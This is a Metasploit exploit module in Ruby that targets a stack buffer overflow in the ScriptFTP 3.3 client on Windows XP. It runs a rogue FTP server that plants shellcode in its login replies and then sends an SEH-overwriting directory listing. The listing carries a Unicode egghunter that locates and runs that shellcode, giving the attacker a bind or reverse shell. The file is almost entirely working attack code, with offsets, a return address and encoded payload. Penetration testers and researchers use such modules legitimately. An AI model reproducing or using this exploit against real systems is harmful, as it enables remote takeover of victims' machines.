##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::FtpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ScriptFTP 3.3 Stack Buffer Overflow',
			'Description'    => %q{
					This PoC created based on Tom Gregory paper for idsecconf2011.
			},
			'Author' 	 =>
				[
					'Muhammad Rasyid Sahputra < mrs [at] infosec-id.com >'
				],
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: $",
			'References'     =>
				[
					[ 'URL', 'http://2011.idsecconf.org/2011/06/paper-idsecconf2011-final.html?spref=tw' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'BadChars' => "\x00\x0a\x2f\x5c\xff\x0c\x0d\x08\x09",
					'Space'    => 350,
					'DisableNops' => true,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'XP Universal', { 'Offset' => 286, 'Ret' => "\x45\x5B" } ], # pop ecx - pop ebp - ret at 0x0050003E [scriptftp.exe], Windows XP SP3
				],
			'Privileged'     => false,
			'DisclosureDate' => '-',
			'DefaultTarget'  => 0))
	end

	def setup
		super
	end
	

	def on_client_unknown_command(c,cmd,arg)
		c.put("200 OK\r\n")
	end

	def on_client_command_list(c,arg)
		conn = establish_data_connection(c)
		if(not conn)
			c.put("425 Can't build data connection\r\n")
			return
		end
		
		print_status("Data connection set up")
		code = 150
		c.put("#{code} Here comes the directory listing.\r\n")
		code = 226
		c.put("#{code} Directory send ok.\r\n")

		nseh = "\x61\x42"     # popad
		seh = target['Ret']   # pop/pop/ret

    # prepare eax
    prepare_eax = "\x55"  # push ebp
    prepare_eax << "\x6e" # nop
    prepare_eax << "\x58" # pop eax
    prepare_eax << "\x6e" # nop
    prepare_eax << "\x05\x14\x11" # add eax, 0x11001400
    prepare_eax << "\x6e" # nop
    prepare_eax << "\x2d\x13\x11" # sub eax, 0x11001300
    prepare_eax << "\x6e" # nop
    
    # jump into eax
    jump_eax = "\x50"   # push eax
    jump_eax << "\x6d"  # nop
    jump_eax << "\xc3"  # ret
		
		# basereg: eax, Unicode encoded egghunter
		hunter =  "PPYAIAIAIAIAQATAXAZAPA3QADAZ"
		hunter << "ABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAX"
		hunter << "A58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABA"
		hunter << "BAB30APB944JBQVE1HJKOLOPB0RBJLBQHHMNNOLM5PZ4"
		hunter << "4JO7H2WP0P0T4TKZZFOSEZJ6OT5K7KO9WA"

		foldername = "ini exploit nya jangan sampe bocor keluar ya,khan mau dibawakan di idsecconf2011,ntar udah gak seru lagi donk :p. intinya sih memanfaatkan SEH untuk gaining code execution, hanya saja yang membuatnya cukup seru adalah proses eksploitasi UNICODE bug dimana butuh lebih banyak kutak-katik"
		padding = "payload juga gak bisa sembarangan karena butuh proses encode-decode, hasilnya pun hrs unicode-proof. enjoy..."
		
		buffer = foldername + nseh + seh + prepare_eax + jump_eax + padding + hunter
		

		print_status("Sending directory list via data connection")
		dirlist = "-rw-rw-r--    1 1176     1176         1060 Aug 16 22:22 #{buffer}\r\n"

		conn.put("total 1\r\n"+dirlist)
		print_status("Payload sent, waiting for the hunter...")
    print_status("Check ur shell later, either bind_shell or reverse_shell. no auto-handler at this time...")

		conn.close
		
		return
	end
	
	
	
	### This part is copied-pasted from ftpserver.rb of metasploit ###
	def on_client_data(c)
		data = c.get_once
		return if not data
		
				return if ((p = regenerate_payload(c)) == nil)

		cmd,arg = data.strip.split(/\s+/, 2)
		arg ||= ""

		return if not cmd

		# Allow per-command overrides
		if(self.respond_to?("on_client_command_#{cmd.downcase}"))
			return self.send("on_client_command_#{cmd.downcase}", c, arg)
		end

		case cmd.upcase
		when 'USER'
			@state[c][:user] = arg
			
			### Sending the egg to be used by hunter later ###
			c.put "331 User name okay, need password...#{"w00tw00t"+payload.encoded}\r\n"
			return

		when 'PASS'
			@state[c][:pass] = arg
			print_status("Client #{@state[c][:name]} LOGIN #{@state[c][:user]} / #{@state[c][:pass]} with payload")
			
			### Sending the egg to be used by hunter later ###
			c.put "230 Login OK #{"w00tw00t"+payload.encoded}\r\n"
			return

		when 'QUIT'
			c.put "221 Logout\r\n"
			return

		when 'SYST'
			c.put "215 UNIX Type: L8\r\n"
			return

		when 'TYPE'
			c.put "200 Type is set\r\n"
			return

		when 'CWD'
			c.put "250 CWD command successful.\r\n"
			return

		when 'PWD'
			c.put "257 \"/\" is current directory.\r\n"
			return

		when 'SIZE'
			c.put "213 1\r\n"
			return

		when 'MDTM'
			c.put "213 #{Time.now.strftime("%Y%m%d%H%M%S")}\r\n"
			return

		when 'PORT'
			port = arg.split(',')[4,2]
			if(not port and port.length == 2)
				c.put("500 Illegal PORT command.\r\n")
				return
			end

			port = port.map{|x| x.to_i}.pack('C*').unpack('n')[0]
			active_data_port_for_client(c, port)

			c.put "200 PORT command successful.\r\n"
			return

		when 'PASV'
			daddr = Rex::Socket.source_address(c.peerhost)
			dport = passive_data_port_for_client(c)
			@state[c][:daddr] = daddr
			@state[c][:dport] = dport
			pasv  = (daddr.split('.') + [dport].pack('n').unpack('CC')).join(',')
			c.put "227 Entering Passive Mode (#{pasv})\r\n"
			return

		when /^(STOR|MKD|REM|DEL|RMD)$/
			c.put "500 Access Denied\r\n"
			return

		else
			# Allow per-command overrides
			if(self.respond_to?("on_client_unknown_command"))
				return self.send("on_client_unknown_command", c, cmd.upcase, arg)
			end

			print_status("#{@state[c][:name]} UNKNOWN '#{cmd} #{arg}'")
			c.put("500 '#{cmd} #{arg}': command not understood.\r\n")
			return
		end

		return

	end
	

end
